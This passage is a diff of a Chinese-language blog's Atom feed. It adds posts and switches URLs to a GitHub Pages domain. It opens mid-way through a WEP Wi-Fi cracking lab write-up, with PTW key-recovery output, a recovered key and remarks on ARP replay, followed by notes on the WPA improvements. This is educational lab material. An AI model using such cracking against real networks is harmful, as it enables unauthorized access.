43(36608) 0E(36096) 23(36096) CE(36096) </span><br><span class="line">   KB    depth   byte(vote)DD(37376) 2B(37120) 43(36608) 0E(36096) 23(36096) CE(36096) </span><br><span class="line">    0    0/  1   57(50176) 23(44800) E5(44544) 43(43776) D7(43776) DD(43520) 0E(43008) </span><br><span class="line">    1    0/  1   45(46080) 84(42496) 86(42496) 94(41984) 83(41728) 2B(41472) 6A(41472) </span><br><span class="line">    2    0/  1   50(52736) EB(45824) CA(44288) F9(43264) 17(42496) 85(42496) 8B(42496) </span><br><span class="line">    3    0/  1   41(49408) EE(44288) 2E(43008) A7(43008) E7(42496) 34(42240) 30(41984) </span><br><span class="line">    4    0/  1   74(54528) E7(44544) 73(43520) 64(43264) D7(43264) 9A(42496) AD(41728) </span><br><span class="line">    5    0/  2   CD(44800) 15(44544) 70(41984) 89(41984) FC(41984) 80(41728) A1(41472) </span><br><span class="line">    6    0/  1   61(46848) 04(44800) 51(43008) 01(42752) 81(41728) B9(41728) F4(41728) </span><br><span class="line">    7    0/  1   63(46848) 3D(44544) 1A(43520) 9E(43520) 3B(42496) 5C(42496) 7B(42496) </span><br><span class="line">    8    0/  1   6B(46336) DF(44032) CE(42496) 10(42240) 74(42240) 0B(41472) 4D(41472) </span><br><span class="line">    9    0/  2   54(42496) 89(42496) 3F(42240) 7E(41984) 8C(41728) D2(41728) 07(41216) </span><br><span class="line">   10    5/  1   C6(43008) 11(42496) A4(42240) F0(42240) 14(41984) CD(41984) 56(41728) </span><br><span class="line">   11    9/  1   A0(40960) DA(40960) 20(40704) 82(40704) 28(40448) 6D(40448) 73(40448) </span><br><span class="line">   12    0/  2   74(45172) 7E(45100) 82(44768) 98(43592) 3C(42896) 89(42536) 60(41988) </span><br><span class="line"></span><br><span class="line">     KEY FOUND! [ 57:45:50:41:74:74:61:63:6B:54:65:73:74 ] (ASCII: WEPAttackTest )</span><br><span class="line">        Decrypted correctly: 100%</span><br></pre></td></tr></table></figure></li></ol><h2 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h2><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>&emsp;&emsp;经测试，在捕捉到大量数据包的情况下，对于13位的字母密钥，PTW攻击只用了几秒钟便成功破解，在ARP重放攻击下，捕获这些数据包也仅仅用了几分钟。</p><p>&emsp;&emsp;WEP引入IV本意是增强协议安全性，但反倒可以根据IV和猜测到的明文数据反推出部分密钥流，从而更容易地攻破密码。</p><h3 id="分析WPA改进"><a href="#分析WPA改进" class="headerlink" title="分析WPA改进"></a>分析WPA改进</h3><h4 id="The-Temporal-Key-Integrity-Protocol（TKIP）"><a href="#The-Temporal-Key-Integrity-Protocol（TKIP）" class="headerlink" title="The Temporal Key Integrity Protocol（TKIP）"></a>The Temporal Key Integrity Protocol（TKIP）</h4><p>&emsp;&emsp;临时密钥完整性协议（TKIP）可以被视为WEP的一个经过大量修改的版本。TKIP仍然使用RC4流密码，但比WEP安全得多。TKIP的设计目标并不是一个尽可能安全的协议。取而代之的是对WEP的修改，它可以防止所有已知的攻击，提供相当高的安全级别，并且可以在大多数现有硬件上使用，只需安装驱动程序或固件更新。</p><h4 id="替换RC4为AES"><a href="#替换RC4为AES" class="headerlink" title="替换RC4为AES"></a>替换RC4为AES</h4><p>&emsp;&emsp;AES密码可以在计数器模式counter mode(CCMP)下用于加密网络传输并保护器完整性。这完全取代了RC4流密码算法，并提供了非常高的安全级别。目前，AES中还没有已知的可实现弱点。</p><h4 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h4><p>&emsp;&emsp;IEEE 802.11增加了企业级密钥管理，允许多种认证模式。STA不再需要一个单独的秘密预共享密钥，而是需要用户名和密码、智能卡、证书、硬件密码器和其他身份验证协议。除了广播， 每个站点都使用单独的密钥与接入点通信，因此同一网络中的另一个站点不再可能进行窃听。</p><h1>参考文献</h1><p><a href="https://www.iacr.org/cryptodb/data/paper.php?pubkey=13751">Attacks on the WEP protocol</a></p><p><a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.484.3279&amp;rep=rep1&amp;type=pdf">A. Klein. Attacks on the RC4 stream cipher. Designs, Codes and Cryptography, 48(3):269–286, 2008.</a></p><p><a href="https://zhuanlan.zhihu.com/p/57677761">密码分析学——深度分析WEP密钥恢复攻击（PTW攻击）</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;WEP-Wi-Fi口令攻击实验&quot;&gt;&lt;a href=&quot;#WEP-Wi-Fi口令攻击实验&quot; class=&quot;headerlink&quot; title=&quot;WEP Wi-Fi口令攻击实验&quot;&gt;&lt;/a&gt;WEP Wi-Fi口令攻击实验&lt;/h1&gt;&lt;h2 id=&quot;实验目的&quot;&gt;&lt;a href=&quot;#实验目的&quot; class=&quot;headerlink&quot; title=&quot;实验目的&quot;&gt;&lt;/a&gt;实验目的&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;了解WEP认证协议流程和其安全缺陷。&lt;/li&gt;
+&lt;li&gt;掌握协议攻击原理和流密码的应用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;实验环境配置&quot;&gt;&lt;a href=&quot;#实验环境配置&quot; class=&quot;headerlink&quot; title=&quot;实验环境配置&quot;&gt;&lt;/a&gt;实验环境配置&lt;/h2&gt;&lt;h3 id=&quot;AP配置&quot;&gt;&lt;a href=&quot;#AP配置&quot; class=&quot;headerlink&quot; title=&quot;AP配置&quot;&gt;&lt;/a&gt;AP配置&lt;/h3&gt;</summary>
+    
+    
+    
+    
+    <category term="密码" scheme="https://qilianshuo.github.io/tags/%E5%AF%86%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Android抓包总结</title>
+    <link href="https://qilianshuo.github.io/2022/03/26/Android%E6%8A%93%E5%8C%85%E6%95%B4%E7%90%86%E5%BD%92%E7%BA%B3/"/>
+    <id>https://qilianshuo.github.io/2022/03/26/Android%E6%8A%93%E5%8C%85%E6%95%B4%E7%90%86%E5%BD%92%E7%BA%B3/</id>
+    <published>2022-03-26T14:42:36.000Z</published>
+    <updated>2022-03-26T15:18:58.884Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>持续记录更新中～🚀</p></blockquote><p>最初接触Android抓包，是需要root的抓包精灵。之后在Windows上使用了很久的Fiddler，并了解到FD也能代理抓包Android，被FD简洁且强大的功能吸引。再之后到现在，使用最多的是HttpCanary，在Android平台上面去了windows代理的麻烦，而且劫持注入等功能也很强大。但是从Android11开始，软件的证书安装出现问题，本来以为作者会尽快修复bug，提供证书导出手动安装功能，但到现在Android12软件闪退，11上的证书问题依旧没有解决。遂决定写文总结之前的抓包经历，以及之后如何优雅地抓包。</p><h3 id="使用过的抓包工具"><a href="#使用过的抓包工具" class="headerlink" title="使用过的抓包工具"></a>使用过的抓包工具</h3><ol><li><p>抓包精灵（Packet Capture）</p><p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220326231801336.png" alt="image-20220326231801336"></p></li><li><p>wicap抓包工具</p><p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220326231009015.png" alt="image-20220326231009015"></p></li><li><p>Fiddler</p><p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220326231853063.png" alt="image-20220326231853063"></p></li><li><p>HttpCanary</p><p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220326231251186.png" alt="image-20220326231251186"></p></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;持续记录更新中～🚀&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;最初接触Android抓包，是需要root的抓包精灵。之后在Windows上使用了很久的Fiddler，并了解到FD也能代理抓包Android，被FD简洁且强大的功能吸引。再之后到现在</summary>
+      
+    
+    
+    
+    <category term="逆向" scheme="https://qilianshuo.github.io/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+    <category term="抓包" scheme="https://qilianshuo.github.io/tags/%E6%8A%93%E5%8C%85/"/>
+    
+  </entry>
+  
+  <entry>
     <title>小程序async-await同异步问题</title>
-    <link href="http://example.com/2022/03/15/%E5%B0%8F%E7%A8%8B%E5%BA%8Fasync-await%E5%90%8C%E5%BC%82%E6%AD%A5%E9%97%AE%E9%A2%98/"/>
-    <id>http://example.com/2022/03/15/%E5%B0%8F%E7%A8%8B%E5%BA%8Fasync-await%E5%90%8C%E5%BC%82%E6%AD%A5%E9%97%AE%E9%A2%98/</id>
+    <link href="https://qilianshuo.github.io/2022/03/15/%E5%B0%8F%E7%A8%8B%E5%BA%8Fasync-await%E5%90%8C%E5%BC%82%E6%AD%A5%E9%97%AE%E9%A2%98/"/>
+    <id>https://qilianshuo.github.io/2022/03/15/%E5%B0%8F%E7%A8%8B%E5%BA%8Fasync-await%E5%90%8C%E5%BC%82%E6%AD%A5%E9%97%AE%E9%A2%98/</id>
     <published>2022-03-15T15:41:44.000Z</published>
     <updated>2022-03-21T08:55:02.158Z</updated>
     
@@ -33,19 +83,19 @@
     
     
     
-    <category term="踩坑记录📝" scheme="http://example.com/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"/>
+    <category term="踩坑记录📝" scheme="https://qilianshuo.github.io/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"/>
     
     
-    <category term="小程序" scheme="http://example.com/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
+    <category term="小程序" scheme="https://qilianshuo.github.io/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
     
-    <category term="js异步" scheme="http://example.com/tags/js%E5%BC%82%E6%AD%A5/"/>
+    <category term="js异步" scheme="https://qilianshuo.github.io/tags/js%E5%BC%82%E6%AD%A5/"/>
     
   </entry>
   
   <entry>
     <title>Miller-Rabin素数测试算法</title>
-    <link href="http://example.com/2022/03/15/Miller-Rabin%E7%B4%A0%E6%95%B0%E6%B5%8B%E8%AF%95%E7%AE%97%E6%B3%95/"/>
-    <id>http://example.com/2022/03/15/Miller-Rabin%E7%B4%A0%E6%95%B0%E6%B5%8B%E8%AF%95%E7%AE%97%E6%B3%95/</id>
+    <link href="https://qilianshuo.github.io/2022/03/15/Miller-Rabin%E7%B4%A0%E6%95%B0%E6%B5%8B%E8%AF%95%E7%AE%97%E6%B3%95/"/>
+    <id>https://qilianshuo.github.io/2022/03/15/Miller-Rabin%E7%B4%A0%E6%95%B0%E6%B5%8B%E8%AF%95%E7%AE%97%E6%B3%95/</id>
     <published>2022-03-15T10:42:01.000Z</published>
     <updated>2022-03-21T08:53:44.921Z</updated>
     
@@ -61,19 +111,19 @@
     
     
     
-    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
+    <category term="算法" scheme="https://qilianshuo.github.io/categories/%E7%AE%97%E6%B3%95/"/>
     
     
-    <category term="素数" scheme="http://example.com/tags/%E7%B4%A0%E6%95%B0/"/>
+    <category term="素数" scheme="https://qilianshuo.github.io/tags/%E7%B4%A0%E6%95%B0/"/>
     
-    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
+    <category term="算法" scheme="https://qilianshuo.github.io/tags/%E7%AE%97%E6%B3%95/"/>
     
   </entry>
   
   <entry>
     <title>RSSI定位算法学习</title>
-    <link href="http://example.com/2022/03/01/RSSI%E5%AE%9A%E4%BD%8D%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
-    <id>http://example.com/2022/03/01/RSSI%E5%AE%9A%E4%BD%8D%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</id>
+    <link href="https://qilianshuo.github.io/2022/03/01/RSSI%E5%AE%9A%E4%BD%8D%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
+    <id>https://qilianshuo.github.io/2022/03/01/RSSI%E5%AE%9A%E4%BD%8D%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</id>
     <published>2022-03-01T10:20:08.000Z</published>
     <updated>2022-03-21T08:53:15.164Z</updated>
     
@@ -97,19 +147,19 @@
     
     
     
-    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <category term="学习笔记" scheme="https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="RSSI" scheme="http://example.com/tags/RSSI/"/>
+    <category term="RSSI" scheme="https://qilianshuo.github.io/tags/RSSI/"/>
     
-    <category term="定位" scheme="http://example.com/tags/%E5%AE%9A%E4%BD%8D/"/>
+    <category term="定位" scheme="https://qilianshuo.github.io/tags/%E5%AE%9A%E4%BD%8D/"/>
     
   </entry>
   
   <entry>
     <title>mac OS快捷键</title>
-    <link href="http://example.com/2022/02/14/mac-OS%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
-    <id>http://example.com/2022/02/14/mac-OS%E5%BF%AB%E6%8D%B7%E9%94%AE/</id>
+    <link href="https://qilianshuo.github.io/2022/02/14/mac-OS%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
+    <id>https://qilianshuo.github.io/2022/02/14/mac-OS%E5%BF%AB%E6%8D%B7%E9%94%AE/</id>
     <published>2022-02-14T08:16:03.000Z</published>
     <updated>2022-03-21T08:55:56.300Z</updated>
     
@@ -125,19 +175,19 @@
     
     
     
-    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <category term="学习笔记" scheme="https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="Mac OS" scheme="http://example.com/tags/Mac-OS/"/>
+    <category term="Mac OS" scheme="https://qilianshuo.github.io/tags/Mac-OS/"/>
     
-    <category term="快捷键" scheme="http://example.com/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
+    <category term="快捷键" scheme="https://qilianshuo.github.io/tags/%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
     
   </entry>
   
   <entry>
     <title>Safari正则兼容问题记录</title>
-    <link href="http://example.com/2022/02/13/Safari%E6%AD%A3%E5%88%99%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
-    <id>http://example.com/2022/02/13/Safari%E6%AD%A3%E5%88%99%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
+    <link href="https://qilianshuo.github.io/2022/02/13/Safari%E6%AD%A3%E5%88%99%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
+    <id>https://qilianshuo.github.io/2022/02/13/Safari%E6%AD%A3%E5%88%99%E5%85%BC%E5%AE%B9%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
     <published>2022-02-13T05:05:32.000Z</published>
     <updated>2022-03-21T08:52:59.787Z</updated>
     
@@ -152,19 +202,19 @@
     
     
     
-    <category term="踩坑记录📝" scheme="http://example.com/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"/>
+    <category term="踩坑记录📝" scheme="https://qilianshuo.github.io/categories/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95%F0%9F%93%9D/"/>
     
     
-    <category term="正则" scheme="http://example.com/tags/%E6%AD%A3%E5%88%99/"/>
+    <category term="正则" scheme="https://qilianshuo.github.io/tags/%E6%AD%A3%E5%88%99/"/>
     
-    <category term="Safari" scheme="http://example.com/tags/Safari/"/>
+    <category term="Safari" scheme="https://qilianshuo.github.io/tags/Safari/"/>
     
   </entry>
   
   <entry>
     <title>Android11使用HttpCanary</title>
-    <link href="http://example.com/2022/02/12/Android11%E4%BD%BF%E7%94%A8HttpCanary/"/>
-    <id>http://example.com/2022/02/12/Android11%E4%BD%BF%E7%94%A8HttpCanary/</id>
+    <link href="https://qilianshuo.github.io/2022/02/12/Android11%E4%BD%BF%E7%94%A8HttpCanary/"/>
+    <id>https://qilianshuo.github.io/2022/02/12/Android11%E4%BD%BF%E7%94%A8HttpCanary/</id>
     <published>2022-02-12T13:55:22.000Z</published>
     <updated>2022-03-21T08:54:44.399Z</updated>
     
@@ -181,17 +231,17 @@
     
     
     
-    <category term="逆向" scheme="http://example.com/categories/%E9%80%86%E5%90%91/"/>
+    <category term="逆向" scheme="https://qilianshuo.github.io/categories/%E9%80%86%E5%90%91/"/>
     
     
-    <category term="抓包" scheme="http://example.com/tags/%E6%8A%93%E5%8C%85/"/>
+    <category term="抓包" scheme="https://qilianshuo.github.io/tags/%E6%8A%93%E5%8C%85/"/>
     
   </entry>
   
   <entry>
     <title>Flask跨域方案</title>
-    <link href="http://example.com/2022/02/08/Flask%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88/"/>
-    <id>http://example.com/2022/02/08/Flask%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88/</id>
+    <link href="https://qilianshuo.github.io/2022/02/08/Flask%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88/"/>
+    <id>https://qilianshuo.github.io/2022/02/08/Flask%E8%B7%A8%E5%9F%9F%E6%96%B9%E6%A1%88/</id>
     <published>2022-02-08T08:28:55.000Z</published>
     <updated>2022-03-21T08:54:32.520Z</updated>
     
@@ -211,19 +261,19 @@
     
     
     
-    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
+    <category term="开发" scheme="https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"/>
     
     
-    <category term="Flask" scheme="http://example.com/tags/Flask/"/>
+    <category term="Flask" scheme="https://qilianshuo.github.io/tags/Flask/"/>
     
-    <category term="跨域" scheme="http://example.com/tags/%E8%B7%A8%E5%9F%9F/"/>
+    <category term="跨域" scheme="https://qilianshuo.github.io/tags/%E8%B7%A8%E5%9F%9F/"/>
     
   </entry>
   
   <entry>
     <title>Python使用redis</title>
-    <link href="http://example.com/2022/02/06/Python%E4%BD%BF%E7%94%A8redis/"/>
-    <id>http://example.com/2022/02/06/Python%E4%BD%BF%E7%94%A8redis/</id>
+    <link href="https://qilianshuo.github.io/2022/02/06/Python%E4%BD%BF%E7%94%A8redis/"/>
+    <id>https://qilianshuo.github.io/2022/02/06/Python%E4%BD%BF%E7%94%A8redis/</id>
     <published>2022-02-06T08:42:53.000Z</published>
     <updated>2022-03-21T08:53:34.912Z</updated>
     
@@ -236,21 +286,21 @@
     
     
     
-    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
+    <category term="开发" scheme="https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"/>
     
     
-    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    <category term="数据库" scheme="https://qilianshuo.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
     
-    <category term="redis" scheme="http://example.com/tags/redis/"/>
+    <category term="redis" scheme="https://qilianshuo.github.io/tags/redis/"/>
     
-    <category term="Python" scheme="http://example.com/tags/Python/"/>
+    <category term="Python" scheme="https://qilianshuo.github.io/tags/Python/"/>
     
   </entry>
   
   <entry>
     <title>Mac安装Reids并配置</title>
-    <link href="http://example.com/2022/02/04/Mac%E5%AE%89%E8%A3%85Reids%E5%B9%B6%E9%85%8D%E7%BD%AE/"/>
-    <id>http://example.com/2022/02/04/Mac%E5%AE%89%E8%A3%85Reids%E5%B9%B6%E9%85%8D%E7%BD%AE/</id>
+    <link href="https://qilianshuo.github.io/2022/02/04/Mac%E5%AE%89%E8%A3%85Reids%E5%B9%B6%E9%85%8D%E7%BD%AE/"/>
+    <id>https://qilianshuo.github.io/2022/02/04/Mac%E5%AE%89%E8%A3%85Reids%E5%B9%B6%E9%85%8D%E7%BD%AE/</id>
     <published>2022-02-04T13:43:24.000Z</published>
     <updated>2022-03-21T08:53:51.859Z</updated>
     
@@ -266,19 +316,19 @@
     
     
     
-    <category term="开发" scheme="http://example.com/categories/%E5%BC%80%E5%8F%91/"/>
+    <category term="开发" scheme="https://qilianshuo.github.io/categories/%E5%BC%80%E5%8F%91/"/>
     
     
-    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
+    <category term="Redis" scheme="https://qilianshuo.github.io/tags/Redis/"/>
     
-    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    <category term="数据库" scheme="https://qilianshuo.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
     
   </entry>
   
   <entry>
     <title>GitHub删除所有提交历史</title>
-    <link href="http://example.com/2022/02/04/GitHub%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2/"/>
-    <id>http://example.com/2022/02/04/GitHub%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2/</id>
+    <link href="https://qilianshuo.github.io/2022/02/04/GitHub%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2/"/>
+    <id>https://qilianshuo.github.io/2022/02/04/GitHub%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2/</id>
     <published>2022-02-04T04:02:24.000Z</published>
     <updated>2022-03-21T08:55:50.096Z</updated>
     
@@ -291,17 +341,17 @@
     
     
     
-    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <category term="学习笔记" scheme="https://qilianshuo.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     
     
-    <category term="git" scheme="http://example.com/tags/git/"/>
+    <category term="git" scheme="https://qilianshuo.github.io/tags/git/"/>
     
   </entry>
   
   <entry>
     <title>Hello World</title>
-    <link href="http://example.com/2022/02/04/hello-world/"/>
-    <id>http://example.com/2022/02/04/hello-world/</id>
+    <link href="https://qilianshuo.github.io/2022/02/04/hello-world/"/>
+    <id>https://qilianshuo.github.io/2022/02/04/hello-world/</id>
     <published>2022-02-04T03:29:52.358Z</published>
     <updated>2022-02-04T03:29:52.358Z</updated>
     
